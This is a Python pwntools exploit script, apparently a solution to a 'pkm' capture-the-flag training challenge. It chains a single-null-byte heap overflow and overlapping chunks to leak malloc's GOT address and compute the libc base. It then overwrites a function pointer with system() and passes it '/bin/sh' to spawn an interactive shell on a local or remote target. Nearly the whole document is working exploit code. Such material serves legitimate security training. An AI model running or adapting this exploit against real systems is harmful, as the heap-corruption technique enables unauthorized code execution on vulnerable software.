from pwn import *
import sys

CHALL_PATH = "./pkm_patched"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("./libc-2.23.so")

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./pkm_patched") 
        gdb.attach(c, """ 
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("pkm.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./pkm_patched")

def add_pkm(c):
    c.recvuntil(b"> ")
    c.sendline(b"0")
    print("pkm added")

def rename_pkm(c, pkm_index, new_name, lenght):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"> ")
    c.sendline(str(pkm_index).encode('utf-8'))
    c.recvuntil(b"[.] insert length: ")
    c.sendline(str(lenght).encode())
    c.send(new_name) # new_name is already encoded
    print("pkm renamed")

def delete_pkm(c, pkm_index):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"> ")
    c.sendline(str(pkm_index).encode('utf-8'))
    print("pkm deleted")

def fight_pkm(c, pkm_first, move, pkm_second):
    c.recvuntil(b"> ")
    c.sendline(b"3")
    c.recvuntil(b"> ")
    c.sendline(str(pkm_first).encode('utf-8'))
    c.recvuntil(b"> ")
    c.sendline(str(move).encode('utf-8'))
    c.recvuntil(b"> ")
    c.sendline(str(pkm_second).encode('utf-8'))

def info_pkm(c, index):
    c.recvuntil(b"> ")
    c.sendline(b"4")
    c.recvuntil(b"> ")
    c.sendline(str(index).encode('utf-8'))
    nameline = c.recvuntil(b" *ATK")[:-len(" *ATK")] # receive until *ATK and remove it
    name = nameline.split(b" *Name: ", 1)[1].strip() 
    return name

def quit(c):
    c.recvuntil(b"> ")
    c.sendline(b"5")

def craft_pkm(index, ptr_name, ptr_move=None):
    binsh = int(b"/bin/sh\x00"[::-1].hex(), 16)
    pkm = b''
    pkm += p64(binsh) + p64(1) #atk, def
    pkm += p64(1) + p64(1) #hp, max_hp
    pkm += p64(1) + p64(ptr_name) # status, name*
    pkm += p64(index) #index
    # filling IVs
    for i in range(4):
        pkm += p64(1)
    # moves
    if ptr_move is not None:
        pkm += p64(0x00400826)
        pkm += p64(ptr_move)

    # padding
    #pkm += b'\x00'* (0xf8 - len(pkm))
    return pkm


# 1st part: leak libc base address
for i in range(3):
    add_pkm(c)

rename_pkm(c, 0, b'A'*0x108, 0x108) # A, index 0
rename_pkm(c, 1, b'B'*0x208, 0x208) # B, fits two pkm, index 1
rename_pkm(c, 2, b'C'*0x100, 0x100) # C, index 2

delete_pkm(c, 1) # free(B) -> C prev_inuse = 0

add_pkm(c) # index 1 (A, empty, C)
rename_pkm(c, 0, b"A"*0x108, 0x108) # single null byte overflow into empty

# allocate two chuncks into old B
add_pkm(c) # B1, index 3
add_pkm(c) # B2, index 4

delete_pkm(c, 3) # free(B1)
delete_pkm(c, 2) # free(C) -> trigger the merge with the previous chunk so that next allocation will overlap with B2

payload = b'D'*0x100 + craft_pkm(4, 0x602048) # address of malloc@GOT as name
rename_pkm(c, 1, payload, len(payload)) 

name = info_pkm(c, 4) + b'\x00'*2 # take name and make it of 8 bytes 
print(name)
leak_malloc = u64(name)
LIBC.address = (leak_malloc - LIBC.symbols.malloc)

# 2nd part: pop a shell by calling system
for i in range(3):
   add_pkm(c) # indexes 2, 3, 5

rename_pkm(c, 2, b'A'*0x108, 0x108) # A
rename_pkm(c, 3, b'B'*0x208, 0x208) # B, fits two pkm
rename_pkm(c, 5, b'C'*0x100, 0x100) # C

delete_pkm(c, 3) # free(B)
add_pkm(c) # index 3 (A, empty, C)

rename_pkm(c, 2, b"A"*0x108, 0x108) # single null byte overflow into empty

add_pkm(c) # B1, index 6
add_pkm(c) # B2, index 7

delete_pkm(c, 6) # free(B1)
delete_pkm(c, 5) # free(C) -> trigger the merge with the previous chunk so that the next allocation will overlap with B3

payload =  b'D'*0x100 + craft_pkm(4, 0x602048, LIBC.symbols.system) #set move = system 
rename_pkm(c, 3, payload, len(payload))

fight_pkm(c, 7, 0, 0)

c.interactive()
